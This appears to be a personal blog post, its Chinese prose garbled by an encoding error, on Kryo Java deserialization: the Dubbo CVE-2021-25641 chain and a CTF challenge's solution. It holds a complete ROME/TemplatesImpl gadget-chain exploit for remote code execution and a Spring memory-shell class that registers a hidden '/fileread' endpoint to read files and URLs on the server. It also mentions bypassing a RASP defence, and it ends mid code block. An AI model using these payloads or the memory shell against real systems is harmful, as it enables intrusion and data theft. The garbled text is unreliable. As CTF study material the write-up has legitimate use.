---
layout: post
title: kryoååºåˆ—åŒ–
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: /img/Zero.png
  credit: Azeril
  creditlink: azeril.comqi
---



## å‰è¨€  ï¼ˆä¸å‡ºç½‘ï¼‰

```java
åˆ«çœ‹äº†ï¼Œåˆšæ‰å¼ºç½‘æ‹Ÿæ€javaé¢˜æ¶¦è¿‡æ¥
Kryoæ˜¯ä¸€ç§å¿«é€Ÿé«˜æ•ˆçš„Javaå¯¹è±¡å›¾åºåˆ—åŒ–æ¡†æ¶ã€‚
```

ä¸€èˆ¬æ¼æ´å‡ºç°å¾—æ¯”è¾ƒå¤šçš„ååºåˆ—åŒ–ç‚¹æ˜¯ä½¿ç”¨`kryo.readClassAndObject`å‡½æ•°ï¼Œé‚£ä¹ˆå¯¹åº”çš„åºåˆ—åŒ–ç‚¹æ˜¯`kryo.writeClassAndObject` ï¼Œå½“ç„¶è¿™ä¸ªç±»ä¹Ÿå­˜åœ¨`readObject`å’Œ`writeObject` æ–¹æ³•ï¼Œä¸è¿‡è¿™é‡Œä»¥å‰ä¸¤ä¸ªä¾‹å­å­¦ä¹ 

### å…ˆç»™å‡ºä¸€ä¸ªä¾‹å­

```java
<dependency>
  <groupId>com.esotericsoftware</groupId>
  <artifactId>kryo</artifactId>
  <version>5.2.0</version>
</dependency>
```

```java
package Kryo;

public class User{
    private String name;
    private int id;
    private String password;

    public User(){
        this.name = "test";
        this.id = 123;
        this.password = "test";
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
}
```

```java
package Kryo;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class test {
    public static void main(String[] args) throws IOException {

        Kryo kryo = new Kryo();
        kryo.register(User.class);
        User u = new User();

        Output output = new Output(new FileOutputStream("file.bin"));
        kryo.writeClassAndObject(output, u);
        output.close();

        Input input = new Input(new FileInputStream("file.bin"));
        User o = (User)kryo.readClassAndObject(input);
        input.close();
        System.out.println(o.getName());
    }
}
```

å¯¹å…¶å†…å®¹è¿›è¡Œè°ƒè¯•ï¼Œå°±èƒ½å¤Ÿå‘ç°è¿™ä¸ªkryoååºåˆ—åŒ–çš„å‡ ä¸ªç‰¹æ€§ï¼š

1. ä»5.0.0ç‰ˆæœ¬åï¼Œkryoæ•´ä½“è¿›è¡Œäº†è¾ƒå¤§çš„é‡æ„ï¼Œå…¶ä¸­ä¸€ä¸ªé‡å¤§çš„æ”¹é€ æ˜¯å°†`com.esotericsoftware.kryo.Kryo`ç±»çš„`registrationRequired`å±æ€§é»˜è®¤è®¾ç½®ä¸ºtrueã€‚ç›¸å½“äºå¼€å¯äº†ç™½åå•ï¼Œåªæœ‰æ³¨å†Œè¿‡çš„ç±»æ‰èƒ½è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚

2. 1. å¦‚æœ`kryo.register(User.class)``**;**` è¿™ä¸€è¡Œä»£ç ç»™å»æ‰ï¼Œä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜ï¼Œæ­¤æ—¶å¹¶ä¸èƒ½æ³¨å†Œ

   2. ![image-20231116202100079](..\img\final\image-20231116202100079.png)

é»˜è®¤ä½¿ç”¨FieldSerizlizerå¤„ç†

![image-20231116202126657](..\img\final\image-20231116202126657.png)

å¿…é¡»è¦æ— å‚æ–¹æ³•ï¼Œ

![image-20231116202144332](..\img\final\image-20231116202144332.png)

# æµ…æDubbo Kryoååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2021-25641ï¼‰

æ­å»ºç¯å¢ƒä¸€ç”Ÿä¹‹æ•Œï¼Œåˆ«é—®é—®å°±æ˜¯ï¼ˆç¯å¢ƒåˆæå¤±è´¥äº†ï¼‰åˆåˆåˆåˆåªèƒ½çœ‹ç€æ–‡ç« è¿›è¡Œåˆ†æäº†

åœ¨DecodeableRpcInvocationç±»çš„decode()å‡½æ•°ä¸­ï¼Œé€šè¿‡serializationTypeä¸º8ã€è·å–åˆ°ååºåˆ—åŒ–å™¨Kryoï¼Œç„¶åè°ƒç”¨readUTF()å‡½æ•°æ¥è¯»å–dubboåè®®å¯¹åº”çš„å­—æ®µä¿¡æ¯å¦‚dubboåè®®ç‰ˆæœ¬ã€æœåŠ¡åç§°ã€æœåŠ¡ç‰ˆæœ¬ã€æ–¹æ³•åã€æ–¹æ³•å‚æ•°ç±»å‹ç­‰ï¼š

é¦–å…ˆæ‰§è¡Œåˆ°decodeï¼ˆï¼‰æ–¹æ³•ï¼Œç„¶å in.readUTF()  ï¼Œåé¢å°±æ˜¯å¯¹æ•°ç»„

![image-20231116220842524](..\img\final\image-20231116220842524.png)

ä»inputä¸­è¯»å–è§£æåˆ°typeä¸ºHashMapï¼Œå› æ­¤ä¼šè°ƒç”¨Kryoçš„MapSerializeråºåˆ—åŒ–å™¨æ¥è¯»å–inputä¸­çš„ä¿¡æ¯ï¼š

![image-20231116221056694](..\img\final\image-20231116221056694.png)

ç„¶åè°ƒç”¨äº†map.put()æ–¹æ³•ç„¶å -----ã€‹equals ã€‚ã€‚ã€‚ã€‚ã€‚ç­‰

Dubboå¹¶ä¸éµå®ˆKryoåŸç”Ÿååºåˆ—åŒ–çš„æµç¨‹ï¼Œé»˜è®¤å°†ç±»æ³¨å†ŒregisterationRequiredå…³é—­äº†ï¼Œ

ï¼Œè€Œä¸”å®ç°çš„`KryoFactory` æ¥å£åœ¨é«˜ç‰ˆæœ¬ä¹Ÿæ²¡æœ‰äº†ï¼Œæ‰€ä»¥Dubboåœ¨è¿™ä¸ªç‰ˆæœ¬é‡Œé¢æ˜¯è‡ªå·±æ•´çš„Kryoçš„ååºåˆ—åŒ–å¤„ç†ï¼Œç§ç§è§£é™¤é™åˆ¶å¯¼è‡´å±å®³æå‡äº†

Dubboé‡Œé¢çš„è‡ªå¸¦çš„fastjsonå®Œæˆåˆ©ç”¨é“¾çš„æ„é€ 

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
write:270, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:280, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:863, JSON (com.alibaba.fastjson)
toString:857, JSON (com.alibaba.fastjson)
    
    
    
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```



## MRCTF javacoffee

#### ä¾èµ– 

```java
Kryo-5.3.0
rome-1.7.0
jackson
snakeyaml
springboot
```

â€‹	æ–¯ï¼Œæ­»å»çš„è®°å¿†çªç„¶è¢­å‡»æˆ‘ï¼Œromeï¼Ÿå¿˜äº†æˆ‘ä¸¢ï¼ŒKryo-5.3.0å¿…é¡»æ³¨å†Œçš„ç±»æ‰å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”ååºåˆ—åŒ–çš„ç±»å¿…é¡»æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ä½¿ç”¨å›ºå®šçš„è§£æå™¨

#### åšé¢˜

```java
public class BaseController {
    protected Kryo kryo = new Kryo();
} 
```

```java
public class CoffeeController extends BaseController {
    @RequestMapping({"/coffee/index"})
    public Message index() {
        return new Message(200, "what do your want? please order");
    }

    @RequestMapping({"/coffee/order"})
    public Message order(@RequestBody CoffeeRequest coffee) {//coffeeæ¥æ”¶ä¼ å‚
        if (coffee.extraFlavor != null) {//extraFlavoræ˜¯ä¸€ä¸ªjavabean
            
            return new Message(200, ((ExtraFlavor) this.kryo.readClassAndObject(new Input(new ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor))))).getName());
            
        } else if (coffee.espresso > 0.5d) {
            return new Message(200, "DOPPIO");
        } else {
            if (coffee.hotWater > 0.5d) {
                return new Message(200, "AMERICANO");
            }
            if (coffee.milkFoam <= 0.0d || coffee.steamMilk <= 0.0d) {
                if (coffee.espresso > 0.0d) {
                    return new Message(200, "Espresso");
                }
                return new Message(200, "empty");
            } else if (coffee.steamMilk > coffee.milkFoam) {
                return new Message(200, "CAPPUCCINO");
            } else {
                return new Message(200, "Latte");
            }
        }
    }

    @org.springframework.web.bind.annotation.RequestMapping({"/coffee/demo"})
    public fun.mrctf.springcoffee.model.Message demoFlavor(@org.springframework.web.bind.annotation.RequestBody java.lang.String r8) throws java.lang.Exception {
        throw new UnsupportedOperationException("Method not decompiled: fun.mrctf.springcoffee.controller.CoffeeController.demoFlavor(java.lang.String):fun.mrctf.springcoffee.model.Message");
    }
}
```

![image-20231117182949441](..\img\final\image-20231117182949441.png)

å…ˆä¼ å…¥ä¸€ä¸ªcoffeeï¼Œå’Œä»¥å¾€ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦ä¼ å…¥Objectå¯¹è±¡ã€ä»¥å¾€éƒ½æ˜¯Stringå¯¹è±¡ã€‚

æ„Ÿè§‰ä¾æ—§æ˜¯ä¼ åºåˆ—åŒ–ï¼Œæ¯•ç«Ÿåé¢ä¹Ÿæ˜¯ååºåˆ—åŒ–



å¯æ˜¯æœ‰ä¸€ä¸ªæƒ…å†µï¼ŒCoffeeRequestè¿™ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ å“¦ï¼Œååºåˆ—åŒ–ä¸€å®šä¼šæŠ¥é”™çš„ï¼Œè¿™æ€ä¹ˆåŠå‘¢ï¼Ÿï¼ˆåªæœ‰æ³¨å†Œè¿‡çš„ç±»æ‰èƒ½è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ï¼‰ğŸ‘´çŒœæµ‹è‚¯å®šæ˜¯åå°„æ”¹é…ç½®å•¥çš„



### stopä»¥ä¸Šçº¯å±çæ‰¯ï¼Œtnndåˆæ˜¯jd-guiè¿™ä¸ªè½¯ä»¶å‘äº†æˆ‘ï¼Œå¥½ç”¨æ˜¯å¥½ç”¨ï¼Œæœ‰æ—¶å€™æ˜¯çœŸä¸æ˜¾ç¤ºä»£ç å•Šã€‚ã€‚ã€‚

![image-20231117185719351](..\img\final\image-20231117185719351.png)

ä»¥åè¿˜æ˜¯é•¿ä¸ªå¿ƒçœ¼ï¼Œideaçœ‹å­ã€‚ã€‚ã€‚

```java
 @RequestMapping("/coffee/demo")
    public Message demoFlavor(@RequestBody String raw) throws Exception {//raw stringè¿›è¡Œä¼ å‚
        System.out.println(raw);
        //ä¾‹  raw={'polish':'true'}
        JSONObject serializeConfig = new JSONObject(raw);//jsonè§£æ
        
        if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){
            kryo=new Kryo();
            for (Method setMethod:kryo.getClass().getDeclaredMethods()) {
                if(!setMethod.getName().startsWith("set")){//éå†åˆ°æ˜¯setå¼€å¤´çš„æ–¹æ³•
                    continue;
                }
                try {
                    Object p1 = serializeConfig.get(setMethod.getName().substring(3));//æˆªå–setåé¢çš„å±æ€§
                    //p1æ˜¯å¯æ§çš„åªéœ€è¦ï¼Œåœ¨jsonä¸­æ·»åŠ   ä¸€ä¸ªset åé¢çš„å±æ€§å€¼è‡ªå·±å†™å³å¯
                    
                    if(!setMethod.getParameterTypes()[0].isPrimitive()){//å¦‚æœå‚æ•°ä¸æ˜¯åŸå§‹ç±»å‹ï¼Œä¸æ˜¯ int String...
                        try {
                            p1 = Class.forName((String) p1).newInstance();//å°±è¿›è¡Œå®ä¾‹åŒ–
                            setMethod.invoke(kryo, p1);//å¹¶ä¸”æ‰§è¡Œæ–¹æ³• p1æ˜¯å‚æ•°
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }else{
                        setMethod.invoke(kryo,p1);
                    }
                }catch (Exception e){
                    continue;
                }
            }
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        kryo.register(Mocha.class);
        kryo.writeClassAndObject(output,new Mocha());
        output.flush();
        output.close();

        return new Message(200,"Mocha!",Base64.getEncoder().encode(bos.toByteArray()));
    }
```

![image-20231117192614107](..\img\final\image-20231117192614107.png)

![image-20231117192745070](..\img\final\image-20231117192745070.png)

è¿™æ ·ä¸€æ¥ï¼Œæœ€æœ‰ä»·å€¼çš„å°±æ˜¯newinstanceã€å’Œè°ƒç”¨ä¸€ä¸ªsetæ–¹æ³•

![image-20231117194136808](..\img\final\image-20231117194136808.png)

è¿™é‡Œå¤§æ¦‚çœ‹äº†ä¸€ä¸‹æ–¹æ³•ï¼Œè«éæ˜¯è®©æˆ‘ä»¬é€šè¿‡è¿™ä¸ªsetä¿®æ”¹æ‰CoffeeRequestè¿™ä¸ªç±»çš„æ³¨å†ŒçŠ¶æ€ğŸ‘´ï¼ˆæ„Ÿè§‰å°±æ˜¯è¿™æ ·çš„ï¼‰

å¯æ˜¯éœ€è¦ä¼ å…¥çš„æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ã€‚ã€‚ï¼ˆå¯èƒ½åˆæƒ³é”™äº†ï¼Œæ ¹æ®è‹±è¯­æ„æ€ï¼šé»˜è®¤åºåˆ—åŒ–å™¨ï¼Ÿè¿™ ä¸æ˜¯å‰é¢çš„ï¼šFiledSerialize ã€MapSerialize)

### æ¶¦å»çœ‹äº†çœ‹wp

tnndæ€æƒ³ç‹­çª„äº†åˆï¼Œä¸‹é¢ä¸ä¹Ÿå¯ä»¥invokeè¿›è¡Œæ‰§è¡Œï¼Ÿï¼Œå†å¾ªç¯ä¸€æ¬¡æ‰€æœ‰çš„setæ–¹æ³•

![image-20231117200058526](..\img\final\image-20231117200058526.png)

![image-20231117200144821](..\img\final\image-20231117200144821.png)

å”‰ï¼Œè‡ªå·±èƒŒé”…ğŸ˜­

![image-20231117200213767](..\img\final\image-20231117200213767.png)

é‚£ä¹ˆCoffeeRequestæœªç»æ³¨å†Œï¼Œåºåˆ—åŒ–ååºåˆ—åŒ–çš„é—®é¢˜å°±è§£å†³äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­äº†ã€‚

ä¸Šä¸€é“é¢˜çš„æ¼æ´æ˜¯å› ä¸ºï¼ŒDubboä¸­æœ‰fastjsonçš„ä¾èµ–ï¼Œè€Œè¿™é“é¢˜æ˜¯æ²¡æœ‰çš„ï¼Œçœ‹ä¸€ä¸‹readobjectæœ‰å•¥ä¸œè¥¿	



æˆ‘å…ˆç›²çŒœä¸€ä¸‹ï¼Œé€šè¿‡setä¿®æ”¹é»˜è®¤åºåˆ—åŒ–å™¨ï¼Œæ”¹æˆMapSerializeï¼Œç„¶åé€šè¿‡è¿™ä¸ªå°±ä¼šè§¦å‘hashmapçš„equalsæ–¹æ³•

ï¼ˆå…¶å®æ˜¯å¤ç°ä¸Šé¢é‚£ä¸ªæ¼æ´çš„ç†è§£ï¼‰ä½†æ˜¯å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œkeyå’Œvalueå’‹ä¼ å…¥ï¼Ÿï¼Ÿï¼Ÿ(å¯¹ä¸èµ·ï¼Œè„‘å­åˆtnndçŸ­è·¯äº†ï¼Œæˆ‘æœ€åè®© writeobject(map)ä¸€ä¸ªmapä¸å°±è¡Œäº†å˜›)

![image-20231117200718197](..\img\final\image-20231117200718197.png)



æ—¢ç„¶å­˜åœ¨ROMEä¾èµ–è‚¯å®šæ˜¯æ‹¿ROMEæ¥æ‰“ï¼Œçœ‹ä¸€ä¸‹è‡ªå·±ä»¥å‰å†™çš„æ–‡ç« 

tnndï¼Œåˆæ˜¯è¿™ç§æŠ¥é”™ï¼Œçƒ¦æ­»

![image-20231117211249174](..\img\final\image-20231117211249174.png)

#### å¹²è„†è‡ªå·±æ–°å»ºäº†ä¸€ä¸ªç±»

å¯¼å…¥romeã€å’Œkryoä¾èµ–å³å¯

![image-20231118105018754](..\img\final\image-20231118105018754.png)

è¿™æ ·çš„è¯é“¾å­å°±æ„é€ å¥½äº†ï¼Œ

`åºåˆ—åŒ–æ²¡é—®é¢˜ï¼Œååºåˆ—åŒ–çš„æ—¶å€™æŠ¥é”™äº†`

æ²¡æœ‰æ— å‚æ„é€ ï¼Œè‚¯å®šä¸èƒ½æ”¹ç±»ï¼Œé‚£è‚¯å®šå°±æ˜¯setteræ–¹æ³•äº†

![image-20231118121146172](..\img\final\image-20231118121146172.png)

![image-20231118122209083](..\img\final\image-20231118122209083.png)

æ ¹æ®æ–¹æ³•åå­—æ¨æµ‹å°±æ˜¯è¿™ä¸ªï¼Œç‚¹è¿›å»ï¼Œå‘ç°æ¥æ”¶InstantiatorStrategyç±»å‹çš„æ•°æ®ï¼Œè€ŒInstantiatorStrategyæ˜¯ä¸€ä¸ªæ¥å£çœ‹ä¸€ä¸‹å®ç°ç±»

![image-20231118122235675](..\img\final\image-20231118122235675.png)

![image-20231118134341337](..\img\final\image-20231118134341337.png)

é»˜è®¤æ˜¯DefaultInstantiatorStrategyç±»ï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä¸€ä¸ªä¸ªè¯•ï¼Œç¬¬äºŒæŸ¥ç™¾åº¦ï¼Œ

![image-20231118135510375](..\img\final\image-20231118135510375.png)

(è¿™æ ·ååºåˆ—åŒ–å°±ä¸ä¼šæŠ¥é”™äº†)

```java
StdInstantiatorStrategy stdInstantiatorStrategy = new StdInstantiatorStrategy();
kryo.setInstantiatorStrategy(stdInstantiatorStrategy);  æ€ªä¸å¾—éœ€è¦åå°„æ–¹æ³•ï¼Œæ¯•ç«Ÿå‚æ•°éœ€è¦objectç±»æ»´
```

ç°åœ¨éœ€è¦ä¿®æ”¹çš„å°±æ˜¯é‚£ä¸ªé»˜è®¤çš„åºåˆ—åŒ–å™¨ï¼ŒFieldSerializeæ”¹æˆMapSerializeï¼ˆ`è¿™é‡Œæƒ³äº†ä¸€ä¸‹ä¼ å…¥Mapçš„ç±»å‹ï¼Œå®ƒä¼šè‡ªåŠ¨ç”¨Mapserialize`ï¼‰

ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ä½†æ˜¯å‚æ•°éœ€è¦æ˜¯ SerializerFactoryç±»å‹çš„

![image-20231118112609681](..\img\final\image-20231118112609681.png)

å¾ˆçº³é—·å“¦ï¼Œç›´æ¥ååºåˆ—åŒ–å¹¶ä¸ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†æ˜¯å¦‚æœç›´æ¥è°ƒè¯•åˆ™ä¼šï¼Œ

![image-20231118145537521](..\img\final\image-20231118145537521.png)

æœ€ç»ˆåŠ äº†ä¸€ä¸ªmakeMapé˜²æ­¢åºåˆ—åŒ–çš„æ—¶å€™è¿›å…¥å‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œç„¶åæˆåŠŸäº†ã€‚

![image-20231118153859591](..\img\final\image-20231118153859591.png)



## å‡†å¤‡å¼€å§‹æ‰“é¢˜ç›®

`é¦–å…ˆæ”¹äºŒå¤„é…ç½®`

```
kryo.setRegistrationRequired(false);
kryo.setInstantiatorStrategy(new StdInstantiatorStrategy());
```

{"polish":true,"RegistrationRequired":false,"InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy"}



```
@RequestBody CoffeeRequest coffee ä¸å¤ªæ‡‚è¿™é‡Œæ€ä¹ˆä¼ å‚å‘¢ï¼Œç™¾åº¦äº†ä¸€ä¸‹ç›´æ¥jsonå°±å¯ä»¥äº†
```

```json
    {
      "extraFlavor": "vanilla"
    }
```

tnndçŠ¯äº†ä¸€ä¸ªè ¢æ¯”é—®é¢˜ï¼Œé¢˜ç›®ä¸­ç”¨çš„æ˜¯rome1.7ï¼Œæˆ‘æœ¬åœ°æ­ç¯å¢ƒç”¨çš„æ˜¯1.0ï¼Œè¿™ä¸¤è€…çš„åŒºåˆ«å¾ˆå¤§

##### åœ¨rome 1.7ä¸­

```java
com.rometools.rome.feed.impl.Objectbean.class
```

##### ä½†æ˜¯åœ¨rome1.0ä¸­

```java
com.sun.syndication.feed.impl.ObjectBean.class;
```

ç±»æ¢äº†ä½ç½®ï¼Œä¸€ç›´ç”¨rome1.0æ‰“rome1.7çº¯2B

```java
import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.json.JSONObject;
import tools.Evil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

public class rome_poc {
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static void main(String[] args) throws Exception {
        Kryo kryo = new Kryo();
        String raw = "{\"polish\":\"true\",\"RegistrationRequired\":false,\"InstantiatorStrategy\": \"org.objenesis.strategy.StdInstantiatorStrategy\"}";

        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            Method[] var3 = kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;
            for(int var5 = 0; var5 < var4; ++var5) {
                Method setMethod = var3[var5];
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                p1 = Class.forName((String)p1).newInstance();
                                setMethod.invoke(kryo, p1);
                            } catch (Exception var9) {
                                var9.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(kryo, p1);
                        }
                    } catch (Exception var10) {
                    }
                }
            }
        }

        byte[] bytes=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap hashMap1 = getpayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);

        //åºåˆ—åŒ–
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        kryo.writeClassAndObject(output, hashMap2);
        output.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));

        //ååºåˆ—åŒ–
        ByteArrayInputStream bas = new ByteArrayInputStream(bos.toByteArray());
        Input input = new Input(bas);
        kryo.readClassAndObject(input);
    }

    public static HashMap getpayload(Class clazz, Object obj) throws Exception {
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        ObjectBean expObjectBean = new ObjectBean(clazz, obj);
        setFieldValue(objectBean, "equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
        return hashMap;
    }
}
```

##### åœ¨è¿™é‡Œä¹ŸæŠ¥äº†å¾ˆå¤šé”™è¯¯

æ¯”å¦‚slf4jï¼Œå¾ˆå¤šæ¬¡äº†éƒ½æ˜¯æŠ¥è¿™ä¸ªé”™è¯¯ï¼Œä»¥å‰ä¹Ÿæœ‰(å¯¼å…¥è¿™ä¸ªä¾èµ–å³å¯)

```java
<dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-api</artifactId>
            <version>1.7.22</version>
        </dependency>
```

![image-20231118175654746](..\img\final\image-20231118175654746.png)

é¦–å…ˆå…ˆä¿®æ”¹å±æ€§çš„å€¼ï¼Œç„¶åæ‰“ä¸Šé¢çš„payload

![image-20231118180434057](..\img\final\image-20231118180434057.png)

å¼€å§‹ç›´æ¥æ‰“é¢˜ç›®çš„ç¯å¢ƒ

![image-20231118180955095](..\img\final\image-20231118180955095.png)

 æœ¬æ¥åœ¨æœåŠ¡å™¨æ­å»ºçš„å¥½å¥½çš„ï¼Œä½†å°±æ˜¯æ­»æ´»æ‰“ä¸ä¸Šå»ï¼Œçœ‹æŠ¥é”™æ—¥å¿—

![image-20231118183101941](..\img\final\image-20231118183101941.png)

çœŸçš„çƒ¦æ­å»ºç¯å¢ƒï¼ï¼ï¼ï¼

#### springboot2.6ä»¥åRequestMappingInfoçš„åˆå§‹åŒ–æ„é€ å‘ç”Ÿäº†ä¸€äº›å˜åŒ–

è¯»æ–‡ä»¶(read=file:.)

 ```java
 String code = request.getParameter("read");
 java.io.PrintWriter writer = response.getWriter();
 String urlContent = "";
 URL url = new URL(code);
 BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
 String inputLine = "";
 while ((inputLine = in.readLine()) != null) {
     urlContent = urlContent + inputLine + "\n";
 }
 in.close();
 writer.println(urlContent);
 writer.flush();
 writer.close();
 ```



```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;

public class FileRead extends AbstractTranslet {

    public FileRead() {

        try {

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = FileRead.class.getMethod("test");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/fileread")
                    .options(config)
                    .build();
            FileRead fileRead = new FileRead("aaa");
            mappingHandlerMapping.registerMapping(info, fileRead, method2);
        } catch (Exception e) {

        }
    }
    public FileRead(String aaa) {

    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public void test() throws IOException {

        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        PrintWriter writer = response.getWriter();
     //exec
        try {
        String urlContent = "";
        final URL url = new URL(request.getParameter("read"));
        final BufferedReader in = new BufferedReader(new
                InputStreamReader(url.openStream()));
        String inputLine = "";
        while ((inputLine = in.readLine()) != null) {
            urlContent = urlContent + inputLine + "\n";
        }
        in.close();
            writer.write(urlContent);
            writer.flush();
            writer.close();
    } catch (Exception e) {

    }

}

    public static void main(String[] args) {

    }
}
```

è¿™é‡Œä¸å‡ºç½‘çš„ç¯å¢ƒï¼ŒThread.slepp(9999) ä¹Ÿåº”è¯¥æ‰§è¡Œçš„å‘€

è¯»å–raspçš„æµç¨‹å°±çœç•¥äº†ï¼Œå…·ä½“å¯çœ‹å®‰æ’æœˆèµ›é‚£é“é¢˜

![image-20231118185217491](..\img\final\image-20231118185217491.png)

![image-20231118185224916](..\img\final\image-20231118185224916.png)

è¿™é“é¢˜çš„è¯ç›¸æ¯”äºå®‰æ’ä»æ…ˆäº†ï¼Œé€šè¿‡è°ƒç”¨ä¸‹é¢çš„UnixProcess#forkAndExecå°±å¯ä»¥ç»•è¿‡ï¼Œç¢°è§è¿™ä¸ªæ–¹æ³•ç›´æ¥è¿”å›äº†

![image-20231118185730405](..\img\final\image-20231118185730405.png)

è¿™æ˜¯windowsç»•è¿‡çš„ä¾‹å­ï¼Œé€šè¿‡åº•å±‚  ProcessImpl#createæ–¹æ³•

```java
